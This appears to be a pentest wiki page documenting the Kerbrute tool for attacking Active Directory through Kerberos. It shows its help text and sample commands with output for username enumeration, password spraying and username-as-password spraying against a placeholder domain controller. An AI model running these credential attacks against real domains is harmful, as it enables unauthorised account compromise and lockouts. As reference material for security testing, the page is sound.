---
title : "Kerbrute"
# pre : ' '
description : "This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication."
date : 2021-02-15T13:24:03+01:00
# hidden : true
# draft : true
weight : 980
tags : ['Other', 'Active Directory']
---

---

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.

A list of common used AD usernames can be downloaded [this link](https://github.com/crypt0rr/common-ad-usernames).

## Installation

Download latest binary from [Github.com](https://github.com/ropnop/kerbrute/releases/latest) or install directly via Go `go install github.com/ropnop/kerbrute@latest`.

## Usage

```plain
kerbrute [command]
```

## Flags

```plain
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 09/22/25 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

## Examples

### Validate usernames against domain

After you succesfully enumerated [usernames](https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt) you can try ASREPRoasting with [Impacket GetNPUsers.py]({{< ref "getnpusers-py" >}}) or use [CrackMapExec]({{< ref "tools/framework/crackmapexec" >}}) to do a password spray.

```plain
$ ./kerbrute userenum --dc 10.10.10.10 -d offsec.nl usersnames.txt -o userenum-output.txt

Version: v1.0.3 (9dad6e1) - 02/15/21 - Ronnie Flathers @ropnop

2021/02/15 13:22:24 >  Using KDC(s):
2021/02/15 13:22:24 >      10.10.10.10:88

2021/02/15 13:22:24 >  [+] VALID USERNAME:     john@offsec.nl
2021/02/15 13:22:24 >  [+] VALID USERNAME:     jane@offsec.nl
2021/02/15 13:22:24 >  [+] VALID USERNAME:     johndo-adm@offsec.nl
2021/02/15 13:22:24 >  [+] VALID USERNAME:     janedo-adm@offsec.nl
2021/02/15 13:22:24 >  Done! Tested 21 usernames (4 valid) in 0.017 seconds
```

To extract the valid usernames to a separate file you can use the following command.

```plain
cat userenum-output.txt | awk '{print $7}' | cut -d '@' -f1 > available-users.txt
```

### Password spray

It can be helpfull to use [LDAPDomainDump]({{< ref "ldapdomaindump" >}}) to gather all user accountnames, filter them and use as input for the spray.

```plain
$ ./kerbrute passwordspray --dc 10.10.10.10 -d offsec.nl users.txt Welkom01!

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/15/21 - Ronnie Flathers @ropnop
```

### Username as password

It can be helpfull to use [LDAPDomainDump]({{< ref "ldapdomaindump" >}}) to gather all user accountnames and use them as input for the 'user-as-pass' spray.

```plain
$ ./kerbrute passwordspray --dc 10.10.10.10 -d offsec.nl users.txt --user-as-pass

   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/   \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 01/17/22 - Ronnie Flathers @ropnop

2022/01/17 15:35:28 >  Using KDC(s):
2022/01/17 15:35:28 >   10.10.10.10:88

2022/01/17 15:35:31 >  [+] VALID LOGIN:  svc_dcsync@offsec.nl:svc_dcsync
2022/01/17 15:35:38 >  Done! Tested 4393 logins (1 successes) in 9.460 seconds
```

## URL List

- [Github.com - kerbrute](https://github.com/ropnop/kerbrute)
